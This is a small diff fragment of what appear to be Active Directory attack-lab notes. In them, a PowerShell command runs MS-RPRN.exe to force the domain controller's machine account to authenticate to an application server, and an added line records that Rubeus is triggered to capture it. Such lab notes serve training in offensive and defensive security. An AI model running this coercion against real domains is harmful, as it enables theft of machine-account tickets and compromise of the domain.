@@ -643,3 +643,5 @@ Now use MS-RPRN to force authentication from dcorp-dc$(Machine account)
 ```powershell
 C:\AD\Tools\MS-RPRN.exe \\dcorp-dc.dollarcorp.moneycorp.local \\dcorp-appsrv.dollarcorp.moneycorp.local
 ```
+Rubeus is triggered
+![[Pasted image 20231025164204.png]]
